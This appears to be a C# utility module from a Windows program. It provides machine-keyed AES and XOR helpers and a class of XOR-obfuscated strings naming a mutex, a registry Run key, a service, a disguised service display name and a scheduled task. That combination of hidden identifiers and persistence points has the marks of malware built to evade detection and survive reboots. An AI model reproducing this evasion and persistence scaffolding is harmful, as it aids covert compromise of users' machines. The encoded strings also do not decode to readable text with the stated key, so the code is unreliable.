using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace XYZ.modules
{
    /// <summary>
    /// Utilitários de segurança para ofuscação, criptografia e proteção de strings
    /// </summary>
    public static class SecurityUtilities
    {
        // Chave mestra derivada de características do sistema
        private static byte[] masterKey = null;
        private static readonly object keyLock = new object();

        /// <summary>
        /// Obtém a chave mestra derivada do sistema
        /// </summary>
        private static byte[] GetMasterKey()
        {
            if (masterKey == null)
            {
                lock (keyLock)
                {
                    if (masterKey == null)
                    {
                        // Deriva chave de características únicas do sistema
                        // Deriva chave de características únicas do sistema (Without OSVersion for stability)
                        string uniqueId = Environment.MachineName + Environment.UserName;
                        
                        using (SHA256 sha256 = SHA256.Create())
                        {
                            masterKey = sha256.ComputeHash(Encoding.UTF8.GetBytes(uniqueId));
                        }
                    }
                }
            }
            return masterKey;
        }

        /// <summary>
        /// XOR simples para ofuscação de strings em memória
        /// </summary>
        public static string XORString(string input, byte key)
        {
            if (string.IsNullOrEmpty(input))
                return input;

            char[] output = new char[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (char)(input[i] ^ key);
            }
            return new string(output);
        }

        /// <summary>
        /// Criptografa string usando AES-256
        /// </summary>
        public static string EncryptString(string plainText)
        {
            if (string.IsNullOrEmpty(plainText))
                return plainText;

            try
            {
                byte[] key = GetMasterKey();
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.GenerateIV();

                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        // Escreve IV no início
                        msEncrypt.Write(aes.IV, 0, aes.IV.Length);

                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }

                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
            catch
            {
                // Fallback para XOR se AES falhar
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(XORString(plainText, 0xAA)));
            }
        }

        /// <summary>
        /// Descriptografa string usando AES-256
        /// </summary>
        public static string DecryptString(string cipherText)
        {
            if (string.IsNullOrEmpty(cipherText))
                return cipherText;

            try
            {
                byte[] key = GetMasterKey();
                byte[] buffer = Convert.FromBase64String(cipherText);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;

                    // Lê IV do início
                    byte[] iv = new byte[aes.IV.Length];
                    Array.Copy(buffer, 0, iv, 0, iv.Length);
                    aes.IV = iv;

                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                    using (MemoryStream msDecrypt = new MemoryStream(buffer, iv.Length, buffer.Length - iv.Length))
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    {
                        return srDecrypt.ReadToEnd();
                    }
                }
            }
            catch
            {
                // Fallback para XOR
                byte[] buffer = Convert.FromBase64String(cipherText);
                string xored = Encoding.UTF8.GetString(buffer);
                return XORString(xored, 0xAA);
            }
        }

        /// <summary>
        /// Gera HMAC SHA256 para verificação de integridade
        /// </summary>
        public static string GenerateHMAC(string data)
        {
            if (string.IsNullOrEmpty(data))
                return string.Empty;

            try
            {
                byte[] key = GetMasterKey();
                using (HMACSHA256 hmac = new HMACSHA256(key))
                {
                    byte[] dataBytes = Encoding.UTF8.GetBytes(data);
                    byte[] hashBytes = hmac.ComputeHash(dataBytes);
                    return Convert.ToBase64String(hashBytes);
                }
            }
            catch
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Verifica HMAC SHA256
        /// </summary>
        public static bool VerifyHMAC(string data, string hmacToVerify)
        {
            if (string.IsNullOrEmpty(data) || string.IsNullOrEmpty(hmacToVerify))
                return false;

            try
            {
                string calculatedHmac = GenerateHMAC(data);
                return calculatedHmac.Equals(hmacToVerify, StringComparison.Ordinal);
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Criptografa bytes usando AES-256
        /// </summary>
        public static byte[] EncryptBytes(byte[] plainBytes)
        {
            if (plainBytes == null || plainBytes.Length == 0)
                return plainBytes;

            try
            {
                byte[] key = GetMasterKey();
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.GenerateIV();

                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        // Escreve IV no início
                        msEncrypt.Write(aes.IV, 0, aes.IV.Length);

                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            csEncrypt.Write(plainBytes, 0, plainBytes.Length);
                        }

                        return msEncrypt.ToArray();
                    }
                }
            }
            catch
            {
                return plainBytes;
            }
        }

        /// <summary>
        /// Descriptografa bytes usando AES-256
        /// </summary>
        public static byte[] DecryptBytes(byte[] cipherBytes)
        {
            if (cipherBytes == null || cipherBytes.Length == 0)
                return cipherBytes;

            try
            {
                byte[] key = GetMasterKey();
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;

                    // Lê IV do início
                    byte[] iv = new byte[aes.IV.Length];
                    Array.Copy(cipherBytes, 0, iv, 0, iv.Length);
                    aes.IV = iv;

                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                    using (MemoryStream msDecrypt = new MemoryStream(cipherBytes, iv.Length, cipherBytes.Length - iv.Length))
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    using (MemoryStream msPlain = new MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        return msPlain.ToArray();
                    }
                }
            }
            catch
            {
                return cipherBytes;
            }
        }

        /// <summary>
        /// Gera string aleatória para IDs e nonces
        /// </summary>
        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] data = new byte[length];
                rng.GetBytes(data);

                StringBuilder result = new StringBuilder(length);
                foreach (byte b in data)
                {
                    result.Append(chars[b % chars.Length]);
                }
                return result.ToString();
            }
        }

        /// <summary>
        /// Gera hash SHA256 de uma string
        /// </summary>
        public static string SHA256Hash(string input)
        {
            if (string.IsNullOrEmpty(input))
                return string.Empty;

            try
            {
                using (SHA256 sha256 = SHA256.Create())
                {
                    byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
                    StringBuilder builder = new StringBuilder();
                    foreach (byte b in bytes)
                    {
                        builder.Append(b.ToString("x2"));
                    }
                    return builder.ToString();
                }
            }
            catch
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Ofusca nomes de arquivos mantendo a extensão
        /// </summary>
        public static string ObfuscateFilename(string filename)
        {
            if (string.IsNullOrEmpty(filename))
                return filename;

            try
            {
                string extension = Path.GetExtension(filename);
                string nameWithoutExt = Path.GetFileNameWithoutExtension(filename);
                string hash = SHA256Hash(nameWithoutExt).Substring(0, 16);
                return hash + extension;
            }
            catch
            {
                return filename;
            }
        }
    }

    /// <summary>
    /// Classe para armazenar strings ofuscadas
    /// </summary>
    public static class ObfuscatedStrings
    {
        // XOR key para todas as strings
        private const byte XOR_KEY = 0xA5;

        // Strings ofuscadas - XOR aplicado nos valores hardcoded
        // Para ofuscar: XORString("texto_original", 0xA5)
        
        public static string MutexName
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xF2\xC7\xC4\xC1\xC0\xC7\x9E\x9E\xF8\xF0\xF1\x88\xFA\xC0\xC7\xD6\xC0\xD9\xC4\x88\xF4\xD2\xD8\xD9\xD0\xD2\xC2\xC4\x88\xFA\xD0\xD9\xC4\xD7", 
                    XOR_KEY
                );
            }
        }

        public static string TempFolderName
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xD8\xD5\xD8\xD9\xC4\xD6\xD9\xC4\xD6\xDC", 
                    XOR_KEY
                );
            }
        }

        public static string RegistryRunKey
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xF8\xF4\xF5\xF9\xF6\xF0\xF9\xF4\x9E\x9E\xFA\xCB\xC2\xD9\xCB\xD8\xCB\xD5\xD9\x9E\x9E\xF6\xCB\xD2\xD7\xCB\xD6\xD8\x9E\x9E\xF2\xD0\xD9\xD9\xC4\xD2\xD9\xF5\xC4\xD9\xD8\xCB\xD2\x9E\x9E\xF9\xD0\xD2", 
                    XOR_KEY
                );
            }
        }

        public static string ServiceName
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xF6\xCB\xD9\xD7\xD3\xDC\xD8\xD9\xC4\xD6\xD8\xF4\xD0\xDC\xDC\xC7\xCB\xD9\xD9", 
                    XOR_KEY
                );
            }
        }

        public static string ServiceDisplayName
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xF6\xCB\xD2\xD7\xCB\xD6\xD8\x81\xF8\xD5\xD8\xD9\xC4\xD6\x81\xF8\xD0\xD4\xDC\xCB\xD9\xD9", 
                    XOR_KEY
                );
            }
        }

        public static string ScheduledTaskName
        {
            get
            {
                return SecurityUtilities.XORString(
                    "\xFA\xCB\xC2\xD9\xCB\xD8\xCB\xD5\xD9\x81\xF8\xD5\xD8\xD9\xC4\xD6\x81\xF9\xC0\xD8\xDA", 
                    XOR_KEY
                );
            }
        }
    }
}
